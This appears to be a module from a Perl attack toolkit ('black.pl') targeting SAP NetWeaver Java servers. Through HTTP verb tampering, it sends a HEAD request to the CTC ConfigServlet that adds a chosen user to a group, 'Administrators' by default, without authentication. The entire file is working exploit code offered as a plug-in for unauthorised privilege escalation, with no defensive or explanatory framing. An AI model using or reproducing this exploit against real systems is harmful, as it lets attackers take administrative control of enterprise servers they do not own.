#!/usr/bin/perl
# Module Add java to a group
# CONFIG
######################
my $desc ="Add JAVA user to a group (verb tampering) \n\t Usage: black.pl .. .. $argv[5] [user] [group]\n\t <user> <group> -  JAVA user name and group name, default is ADMIN:Administrators\n\n"; 
our $funcName="add_java_user2group_head_Func";

######################
push(@descriptions,$desc);
push(@functions,$funcName);
######################


# Special function
######################

sub add_java_user2group_head_Func()
{

	if ($ARGV[$m_arg_i+1]){
		$java_user=$ARGV[$m_arg_i+1];
		print $java_user." - java_user \n\n";
	} else {
		$java_user='ADMIN';
	}

	if ($ARGV[$m_arg_i+2]){
		$java_group=$ARGV[$m_arg_i+2];
		print $java_group." - java_group \n\n";	
	} else {
		$java_group='Administrators';
	}
	my $XML='';
	
	my @answers=send_soap($XML,1,"/ctc/ConfigServlet?param=com.sap.ctc.util.UserConfig;ADD_USER_TO_GROUP;USERNAME=$java_user,GROUPNAME=$java_group","HEAD",1);
	my $answer=join('', @answers);
	
	print $answer;

	print "\n\n";

}